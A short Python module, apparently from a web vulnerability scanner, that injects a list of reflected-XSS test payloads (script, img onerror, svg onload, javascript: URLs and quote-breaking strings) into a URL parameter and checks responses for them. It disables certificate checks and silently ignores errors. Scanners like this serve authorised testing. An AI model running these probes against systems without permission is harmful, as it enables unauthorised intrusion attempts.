import re
from typing import Optional, Dict
import requests

XSS_CONFIRMATION_PATTERNS = [
    r'<script>alert\(1\)</script>',
    r'onerror=alert\(1\)',
    r'onload=alert\(1\)',
    r'javascript:alert\(1\)',
    r'<svg/onload=alert\(1\)>',
    r'<img src=x onerror=alert\(1\)>',
    r'<body onload=alert\(1\)>',
    r'<details open ontoggle=alert\(1\)>',
]


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0) -> Dict:
    if sess is None:
        sess = requests.Session()
    result = {"vulnerable": False, "confirmed": False, "evidence": [],
              "payloads": []}

    confirm_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        '<input autofocus onfocus="alert(1)">',
        "<details open ontoggle=alert(1)>",
        "javascript:alert(1)",
        "\"-alert(1)-\"",
        "';-alert(1)-'",
    ]

    for payload in confirm_payloads:
        try:
            sep = "&" if "?" in url else "?"
            r = sess.get("%s%s%s=%s" % (url, sep, param, payload),
                         timeout=timeout, verify=False)
            for pat in XSS_CONFIRMATION_PATTERNS:
                if re.search(pat, r.text, re.IGNORECASE):
                    result["vulnerable"] = True
                    result["confirmed"] = True
                    result["evidence"].append("confirmed with: %s" % payload[:30])
                    result["payloads"].append(payload)
                    break
            if result["confirmed"]:
                break
        except:
            pass

    if not result["vulnerable"]:
        for payload in ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]:
            try:
                sep = "&" if "?" in url else "?"
                r = sess.get("%s%s%s=%s" % (url, sep, param, payload),
                             timeout=timeout, verify=False)
                if payload in r.text:
                    result["vulnerable"] = True
                    result["evidence"].append("reflected: %s" % payload[:20])
                    result["payloads"].append(payload)
                    break
            except:
                pass

    return result
